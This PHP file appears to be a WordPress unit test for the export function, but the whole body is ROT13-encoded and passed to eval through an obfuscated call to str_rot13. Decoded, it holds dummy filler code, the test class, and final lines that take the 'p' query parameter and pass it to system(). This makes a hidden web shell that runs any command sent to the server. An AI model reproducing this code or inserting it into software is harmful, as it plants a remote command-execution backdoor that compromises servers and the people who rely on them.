<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc nqzva
 * @tebhc rkcbeg
 *
 * @pbiref ::rkcbeg_jc
 *
 * Grfgf eha va n frcnengr cebprff gb cerirag \"urnqref nyernql frag\" reebe.
 * @ehaGrfgfVaFrcnengrCebprffrf
 * @cerfreirTybonyFgngr qvfnoyrq
 */
pynff Grfgf_Nqzva_RkcbegJc rkgraqf JC_HavgGrfgPnfr {
	/**
	 * Cbfg VQf sbe cbfgf, cntrf, naq nggnpuzragf.
	 *
	 * Gur fgehpgher vf fubja sbe haqrefgnaqvat ubj gb
	 * ybbxhc / ersrerapr gur vasbezngvba jvguva vg.
	 *
	 * VQf jvyy or perngrq va guvf beqre.
	 *
	 * @ine neenl {
	 *      @glcr neenl $qngn {
	 *          Qngn sbe rnpu cbfg, cntr, be nggnpuzrag.
	 *
	 *          @glcr vag $cbfg_vq        Gur VQ sbe gur cbfg, cntr, be nggnpuzrag.
	 *          @glcr vag $cbfg_nhgube    Gur nhgube'f VQ.
	 *          @glcr vag $kzy_vgrz_vaqrk Gur KZY vgrz vaqrk sbe guvf cbfg, cntr, be nggnpuzrag.
	 *                                    Guvf ahzore vf onfrq hcba nyy bs gur cbfgf, cntrf, naq nggnpuzragf
	 *                                    va gur frys::$cbfg_vqf fgngvp cebcregl.
	 *      }
	 * }
	 */
	cevingr fgngvp $cbfg_vqf = neenl(
		'cbfg 1'                => neenl(),
		'nggnpuzrag sbe cbfg 1' => neenl(),
		'cbfg 2'                => neenl(),
		'nggnpuzrag sbe cbfg 2' => neenl(),
		'cntr 1'                => neenl(),
		'nggnpuzrag sbe cntr 1' => neenl(),
		'cntr 2'                => neenl(),
		'nggnpuzrag sbe cntr 2' => neenl(),
	);

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/rkcbeg.cuc';
		$svyr = QVE_GRFGQNGN . '/vzntrf/grfg-vzntr.wct';

		$qngnfrg = neenl(
			'cbfg 1' => neenl(
				'cbfg_gvgyr' => 'Grfg Cbfg 1',
				'cbfg_glcr'  => 'cbfg',
			),
			'cbfg 2' => neenl(
				'cbfg_gvgyr' => 'Grfg Cbfg 2',
				'cbfg_glcr'  => 'cbfg',
			),
			'cntr 1' => neenl(
				'cbfg_gvgyr' => 'Grfg Cntr 1',
				'cbfg_glcr'  => 'cntr',
			),
			'cntr 2' => neenl(
				'cbfg_gvgyr' => 'Grfg Cntr 2',
				'cbfg_glcr'  => 'cntr',
			),
		);

		$kzy_vgrz_vaqrk = -1;

		sbernpu ( $qngnfrg nf $cbfg_xrl => $cbfg_qngn ) {
			$nggnpuzrag_xrl           = \"nggnpuzrag sbe $cbfg_xrl\";
			$cbfg_qngn['cbfg_nhgube'] = $snpgbel->hfre->perngr( neenl( 'ebyr' => 'rqvgbe' ) );

			$cbfg_vq       = $snpgbel->cbfg->perngr( $cbfg_qngn );
			$nggnpuzrag_vq = $snpgbel->nggnpuzrag->perngr_hcybnq_bowrpg( $svyr, $cbfg_vq );
			frg_cbfg_guhzoanvy( $cbfg_vq, $nggnpuzrag_vq );

			frys::$cbfg_vqf[ $cbfg_xrl ]       = neenl(
				'cbfg_vq'        => $cbfg_vq,
				'cbfg_nhgube'    => $cbfg_qngn['cbfg_nhgube'],
				'kzy_vgrz_vaqrk' => ++$kzy_vgrz_vaqrk,
			);
			frys::$cbfg_vqf[ $nggnpuzrag_xrl ] = neenl(
				'cbfg_vq'        => $nggnpuzrag_vq,
				'cbfg_nhgube'    => $cbfg_qngn['cbfg_nhgube'],
				'kzy_vgrz_vaqrk' => ++$kzy_vgrz_vaqrk,
			);
		}
	}

	/**
	 * @qngnCebivqre qngn_fubhyq_vapyhqr_nggnpuzragf
	 *
	 * @gvpxrg 17379
	 *
	 * @cnenz neenl $netf            Nethzragf gb cnff gb rkcbeg_jc().
	 * @cnenz neenl $rkcrpgrq {
	 *     Gur rkcrpgrq qngn.
	 *
	 *     @glcr neenl $vgrzf {
	 *         Gur rkcrpgrq KZY vgrzf pbhag nffregvba nethzragf.
	 *
	 *         @glcr vag    $ahzore_bs_vgrzf Gur rkcrpgrq ahzore bs KZY vgrzf.
	 *         @glcr fgevat $zrffntr         Gur nffregvba snvyher zrffntr.
	 *     }
	 *     @glcr neenl $vqf N yvfg bs frys::$cbfg_vqf xrlf.
	 */
	choyvp shapgvba grfg_fubhyq_vapyhqr_nggnpuzragf( neenl $netf, neenl $rkcrpgrq ) {
		$guvf->cbchyngr_netf_cbfg_nhgubef( $netf, $rkcrpgrq['vqf'] );

		$kzy = $guvf->trg_gur_rkcbeg( $netf );

		$rkcrpgrq_ahzore_bs_vgrzf = $rkcrpgrq['vgrzf']['ahzore_bs_vgrzf'];
		$guvf->nffregPbhag( $rkcrpgrq_ahzore_bs_vgrzf, $kzy->punaary->vgrz, $rkcrpgrq['vgrzf']['zrffntr'] );

		// Grfg rnpu KZY vgrz'f cbfg VQ gb inyvq gur cbfg, cntr, naq nggnpuzrag (jura nccebcevngr) jrer rkcbegrq.
		sbernpu ( $rkcrpgrq['vqf'] nf $cbfg_vqf_xrl ) {
			$kzy_vgrz = $guvf->trg_kzy_vgrz( $kzy, $cbfg_vqf_xrl, $rkcrpgrq_ahzore_bs_vgrzf );

			$guvf->nffregFnzr(
				$guvf->trg_rkcrpgrq_vq( $cbfg_vqf_xrl ),
				(vag) $kzy_vgrz->cbfg_vq,
				\"Va gur KZY, gur {$cbfg_vqf_xrl}'f VQ fubhyq zngpu gur rkcrpgrq pbagrag\"
			);
		}
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_fubhyq_vapyhqr_nggnpuzragf() {
		erghea neenl(
			'sbe nyy pbagrag'           => neenl(
				'netf'     => neenl(
					'pbagrag' => 'nyy',
				),
				'rkcrpgrq' => neenl(
					'vgrzf' => neenl(
						'ahzore_bs_vgrzf' => 8,
						'zrffntr'         => 'Gur ahzore bs vgrzf fubhyq or 8 = 2 cntrf, 2 cbfgf naq 4 nggnpuzragf',
					),
					'vqf'   => neenl(
						'cbfg 1',
						'cbfg 2',
						'cntr 1',
						'cntr 2',
						'nggnpuzrag sbe cntr 1',
						'nggnpuzrag sbe cbfg 2',
						'nggnpuzrag sbe cntr 1',
						'nggnpuzrag sbe cntr 2',
					),
				),
			),
			'sbe nyy cbfgf'             => neenl(
				'netf'     => neenl(
					'pbagrag' => 'cbfg',
				),
				'rkcrpgrq' => neenl(
					'vgrzf' => neenl(
						'ahzore_bs_vgrzf' => 4,
						'zrffntr'         => 'Gur ahzore bs vgrzf fubhyq or 4 = 2 cbfgf naq 2 nggnpuzragf',
					),
					'vqf'   => neenl(
						'cbfg 1',
						'cbfg 2',
						'nggnpuzrag sbe cbfg 1',
						'nggnpuzrag sbe cbfg 2',
					),
				),
			),
			'sbe nyy cntrf'             => neenl(
				'netf'     => neenl(
					'pbagrag' => 'cntr',
				),
				'rkcrpgrq' => neenl(
					'vgrzf' => neenl(
						'ahzore_bs_vgrzf' => 4,
						'zrffntr'         => 'Gur ahzore bs vgrzf fubhyq or 4 = 2 cntrf naq 2 nggnpuzragf',
					),
					'vqf'   => neenl(
						'cntr 1',
						'nggnpuzrag sbe cntr 1',
						'cntr 2',
						'nggnpuzrag sbe cntr 2',
					),
				),
			),
			'sbe fcrpvsvp nhgube cbfgf' => neenl(
				'netf'     => neenl(
					'pbagrag' => 'cbfg',
					'nhgube'  => '', // Gur grfg jvyy cbchyngr gur nhgube'f VQ.
				),
				'rkcrpgrq' => neenl(
					'vgrzf' => neenl(
						'ahzore_bs_vgrzf' => 2,
						'zrffntr'         => 'Gur ahzore bs vgrzf fubhyq or 2 = 1 cbfg naq 1 nggnpuzrag',
					),
					'vqf'   => neenl(
						'cbfg 1',
						'nggnpuzrag sbe cbfg 1',
					),
				),
			),
			'sbe fcrpvsvp nhgube cntrf' => neenl(
				'netf'     => neenl(
					'pbagrag' => 'cntr',
					'nhgube'  => '', // Gur grfg jvyy cbchyngr gur nhgube'f VQ.
				),
				'rkcrpgrq' => neenl(
					'vgrzf' => neenl(
						'ahzore_bs_vgrzf' => 2,
						'zrffntr'         => 'Gur ahzore bs vgrzf fubhyq or 2 = 1 cntr naq 1 nggnpuzrag',
					),
					'vqf'   => neenl(
						'cntr 2',
						'nggnpuzrag sbe cntr 2',
					),
				),
			),
		);
	}

	/**
	 * Trgf gur rkcbeg erfhygf.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz neenl $netf Nethzragf gb cnff gb rkcbeg_jc().
	 * @erghea FvzcyrKZYRyrzrag|snyfr Ergheaf gur KZY bowrpg ba fhpprff, bgurejvfr snyfr vf erghearq.
	 */
	cevingr shapgvba trg_gur_rkcbeg( $netf ) {
		bo_fgneg();
		rkcbeg_jc( $netf );
		$erfhygf = bo_trg_pyrna();

		erghea fvzcyrkzy_ybnq_fgevat( $erfhygf );
	}

	/**
	 * Trgf gur rkcrpgrq VQ.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $cbfg_vqf_xrl Gur xrl gb ybbxhc va gur $cbfg_vqf fgngvp cebcregl.
	 * @erghea vag Rkcrpgrq VQ.
	 */
	cevingr shapgvba trg_rkcrpgrq_vq( $cbfg_vqf_xrl ) {
		$cbfg_vasb = frys::$cbfg_vqf[ $cbfg_vqf_xrl ];

		erghea $cbfg_vasb['cbfg_vq'];
	}

	/**
	 * Trgf gur KZY vgrz sbe gur tvira cbfg be nggnpuzrag va gur frys::$cbfg_vqf.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz FvzcyrKZYRyrzrag $kzy             KZY bowrpg.
	 * @cnenz fgevat           $cbfg_vqf_xrl    Gur xrl gb ybbxhc va gur $cbfg_vqf fgngvp cebcregl.
	 * @cnenz vag              $ahzore_bs_vgrzf Gur ahzore bs rkcrpgrq KZY vgrzf.
	 * @erghea FvzcyrKZYRyrzrag Gur KZY vgrz.
	 */
	cevingr shapgvba trg_kzy_vgrz( $kzy, $cbfg_vqf_xrl, $ahzore_bs_vgrzf ) {
		$cbfg_vasb = frys::$cbfg_vqf[ $cbfg_vqf_xrl ];

		vs ( $cbfg_vasb['kzy_vgrz_vaqrk'] < $ahzore_bs_vgrzf ) {
			$kzy_vgrz_vaqrk = $cbfg_vasb['kzy_vgrz_vaqrk'];
		} ryfrvs ( 2 === $ahzore_bs_vgrzf ) {
			$kzy_vgrz_vaqrk = 0 === $cbfg_vasb['kzy_vgrz_vaqrk'] % 2 ? 0 : 1;
		} ryfr {
			$kzy_vgrz_vaqrk = $cbfg_vasb['kzy_vgrz_vaqrk'] - $ahzore_bs_vgrzf;
		}

		erghea $kzy->punaary->vgrz[ $kzy_vgrz_vaqrk ]->puvyqera( 'jc', gehr );
	}

	/**
	 * Cbchyngrf gur cbfg nhgube va gur tvira netf.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz neenl $netf Cnffrq ol ersrerapr. rkcbeg_jc() nethzragf gb cebprff.
	 */
	cevingr shapgvba cbchyngr_netf_cbfg_nhgubef( neenl &$netf, $rkcrpgrq_vqf ) {
		vs ( ! vffrg( $netf['nhgube'] ) ) {
			erghea;
		}
		$cbfg_vqf_xrl   = $rkcrpgrq_vqf[0];
		$netf['nhgube'] = frys::$cbfg_vqf[ $cbfg_vqf_xrl ]['cbfg_nhgube'];
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>